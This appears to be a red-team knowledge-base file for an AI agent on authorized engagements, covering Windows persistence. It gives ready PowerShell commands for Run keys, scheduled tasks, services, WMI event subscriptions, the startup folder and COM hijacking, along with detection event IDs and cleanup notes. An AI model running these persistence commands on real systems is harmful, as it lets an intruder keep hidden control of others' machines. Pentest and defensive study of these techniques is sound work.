---
name: foothold-durability
description: >-
  Persistence (native) — Knowledge Base — Native persistence for authorized engagements — to
  demonstrate a foothold's durability in the report, not to hide. All Tier 0. **Always clean up at
  engagement end** (`flows-forge.md ## Teardown` discipline applies). Triggers: persistence, Run key,
  registry autorun, scheduled task persistence, service install, WMI event subscription, startup
  folder, COM hijack.
license: MIT
metadata:
  user-invocable: "false"
  origin: agents/foothold-durability/foothold-durability.md (verbatim; frontmatter prefixado)
  progressive-disclosure: index-first
---
# Persistence (native) — Knowledge Base
_Last updated: 2026-06-22_

Native persistence for authorized engagements — to demonstrate a foothold's durability in the report, not to hide. All Tier 0. **Always clean up at engagement end** (`flows-forge.md ## Teardown` discipline applies).

## Index
| # | Technique | When | Tier | Tags |
|---|-----------|------|------|------|
| T1 | Registry Run/RunOnce key | User or admin context; logon persistence | 0-native | windows-local, persistence |
| T2 | Scheduled task persistence | Want a time/trigger-based foothold | 0-native | windows-local, persistence |
| T3 | Service install persistence | Admin; want SYSTEM persistence | 0-native | windows-local, persistence, requires-admin |
| T4 | WMI permanent event subscription | Admin; want stealthy fileless persistence | 0-native | windows-local, persistence, wmi, requires-admin |
| T5 | Startup folder / logon script | Low-priv user persistence | 0-native | windows-local, persistence, non-admin |
| T6 | COM hijack | Per-user hijack of a frequently-loaded CLSID | 0-native | windows-local, persistence |

## Techniques

### T1: Registry Run/RunOnce key
Tags: windows-local, persistence
When: Demonstrating logon persistence.
Why: The classic, most-portable persistence — a value under `...\CurrentVersion\Run` runs at logon. `HKCU` for user-scope (no admin), `HKLM` for all users (admin). Native registry write.
Tier: 0-native
Steps: 1. Write a Run value 2. Verify it survives logoff/logon 3. Record for cleanup
Payload:
```powershell
Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name Updater -Value 'C:\Temp\p.exe'
```
Signal: payload runs at next logon. | Pitfall: highly monitored (autoruns, Sysmon ID 13). Note in the finding that it's loud — that's a point in the report, not a flaw.
Source: distilled native persistence — 2026-06-22

### T2: Scheduled task persistence
Tags: windows-local, persistence
When: Want trigger flexibility (at logon, on idle, every N minutes).
Why: A scheduled task is more flexible than a Run key and can run as SYSTEM. Native `Register-ScheduledTask`.
Tier: 0-native
Steps: 1. Define trigger + action + principal 2. Register 3. Verify + record
Payload:
```powershell
$a=New-ScheduledTaskAction -Execute 'C:\Temp\p.exe'
$t=New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask -TaskName 'Updater' -Action $a -Trigger $t -RunLevel Highest -Force
```
Signal: task fires on the trigger. | Pitfall: `-RunLevel Highest`/SYSTEM principal needs admin; logged (Event 4698).
Source: distilled native persistence — 2026-06-22

### T3: Service install persistence
Tags: windows-local, persistence, requires-admin
When: Admin; want SYSTEM-level boot persistence.
Why: An auto-start service runs as SYSTEM at boot before user logon. Native `New-Service` / `sc create`.
Tier: 0-native
Steps: 1. `New-Service` auto-start 2. Verify 3. Record
Payload:
```powershell
New-Service -Name Updater -BinaryPathName 'C:\Temp\p.exe' -StartupType Automatic
```
Signal: starts at boot as SYSTEM. | Pitfall: needs a real service binary or it fails to start cleanly; very loud (Event 7045).
Source: distilled native persistence — 2026-06-22

### T4: WMI permanent event subscription
Tags: windows-local, persistence, wmi, requires-admin
When: Admin; want fileless, stealthier persistence.
Why: A `__EventFilter` + `CommandLineEventConsumer` + binding runs a command when a WMI event fires (e.g., on a time interval or logon) — no file on disk, no Run key. Native WMI.
Tier: 0-native
Steps: 1. Create filter (the trigger query) 2. Create consumer (the action) 3. Bind them
Payload:
```powershell
$f = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{Name='f1';EventNamespace='root\cimv2';QueryLanguage='WQL';Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"}
$c = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name='c1';CommandLineTemplate='cmd /c C:\Temp\p.exe'}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$f;Consumer=$c}
```
Signal: command fires on the event. | Pitfall: powerful + persistent — MUST clean up all three objects at teardown (`Get-WmiObject -Namespace root\subscription`). Defender ATP watches `root\subscription` writes.
Source: distilled native WMI persistence — 2026-06-22

### T5: Startup folder / logon script
Tags: windows-local, persistence, non-admin
When: Low-priv user, no registry/admin needed.
Why: Anything in the user's Startup folder runs at logon — pure file write, no special rights.
Tier: 0-native
Steps: 1. Drop a shortcut/script in Startup 2. Verify
Payload:
```powershell
Copy-Item p.exe "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\p.exe"
```
Signal: runs at user logon. | Pitfall: user-scope only; obvious to anyone inspecting the folder.
Source: distilled native persistence — 2026-06-22

### T6: COM hijack
Tags: windows-local, persistence
When: A frequently-loaded CLSID is registered per-user (`HKCU`) or missing, and you can supply it.
Why: Applications resolve COM objects via the registry; pointing a hijackable CLSID's `InprocServer32` at your DLL (per-user, no admin) runs your code when that object is instantiated. Stealthy, native.
Tier: 0-native
Steps: 1. Find a hijackable/abandoned CLSID loaded by a target process 2. Write `HKCU\Software\Classes\CLSID\{..}\InprocServer32` 3. Wait for instantiation
Payload:
```powershell
$clsid='{HIJACKABLE-CLSID}'
New-Item "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32" -Force | Out-Null
Set-ItemProperty "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32" -Name '(default)' -Value 'C:\Temp\evil.dll'
```
Signal: your DLL loads when the target instantiates the CLSID. | Pitfall: finding a *reliably-loaded, hijackable* CLSID is the hard part — use `host-inventory` + Procmon-style observation (or note the candidate and the trigger app).
Source: distilled native COM-hijack persistence — 2026-06-22
